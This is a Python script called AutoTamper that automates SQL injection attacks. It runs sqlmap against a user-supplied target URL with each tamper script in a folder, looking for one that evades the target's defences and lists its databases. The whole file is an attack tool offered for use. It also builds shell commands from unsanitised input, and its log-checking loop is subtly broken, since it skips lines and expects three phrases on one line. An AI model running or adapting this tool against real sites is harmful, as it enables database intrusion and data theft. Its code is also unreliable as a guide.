import os
import re
from colorama import Fore, Style, init

# Initialize colorama
init()
# Get the current directory
current_directory = os.getcwd()

# Introduction text
intro_text = """

░█▀▀▄░█░▒█░▀█▀░▄▀▀▄░░░▀▀█▀▀░█▀▀▄░█▀▄▀█░▄▀▀▄░█▀▀░█▀▀▄
▒█▄▄█░█░▒█░░█░░█░░█░░░░▒█░░░█▄▄█░█░▀░█░█▄▄█░█▀▀░█▄▄▀
▒█░▒█░░▀▀▀░░▀░░░▀▀░░░░░▒█░░░▀░░▀░▀░░▒▀░█░░░░▀▀▀░▀░▀▀

AutoTamper is an automatic tamper test tool using SQLMap. It allows you to input a target URL
with an injection point and a set of SQLMap command options. The tool then runs SQLMap with
various tamper scripts to identify which tamper script works best with your target.

"""

# Center the introduction text
intro_lines = intro_text.strip().split('\n')
max_line_length = max(len(line) for line in intro_lines)
centered_intro = "\n".join(line.center(max_line_length) for line in intro_lines)
print("\n\n\n" + centered_intro + "\n\n\n")

# Get user input
my_url = input(f"{Fore.YELLOW}Enter the URL with the injection point (e.g., https://sample.com/index.php?id=1*): {Style.RESET_ALL}")
my_command = input(f"{Fore.YELLOW}Enter SQLMap command (e.g., --batch --current-db --dbs --level 5 --risk 3 --dbms mysql): {Style.RESET_ALL}")

# Construct the SQLMap command
command = f'sqlmap.py -u "{my_url}" {my_command}'

my_target_match = re.search(r'//(.*?)/', my_url)
i = '0'

if my_target_match:
    my_target = my_target_match.group(1)
    print(f"\n{Fore.GREEN}Target URL: {my_url}")
    print(f"SQLMap Command: {command}\n")
    print(f"{Fore.CYAN}Running SQLMap...{Style.RESET_ALL}")

    tamper_directory = os.path.join(current_directory, "tamper")
    output_directory = os.path.join(current_directory, "output")

    entries = os.listdir(tamper_directory)

    for entry in entries:
        os.system(f"{command} --output-dir={output_directory} --tamper {os.path.join(tamper_directory, entry)}")
        with open(os.path.join(output_directory, my_target, 'log')) as f:
            line = f.readline()
            while line:
                line = f.readline()
                if 'web server operating system' in line:
                    if 'web application technology' in line:
                        if 'available databases' in line:
                            print(f"\n{Fore.GREEN}Your Tamper is: {entry}{Style.RESET_ALL}")
                            i = '1'
                            break
                line = f.readline()
        if i == '1':
            break

    if i == '0':
        print(f"\n{Fore.YELLOW}No Tamper found.{Style.RESET_ALL}")
else:
    print(f"\n{Fore.RED}Invalid URL format.{Style.RESET_ALL}")
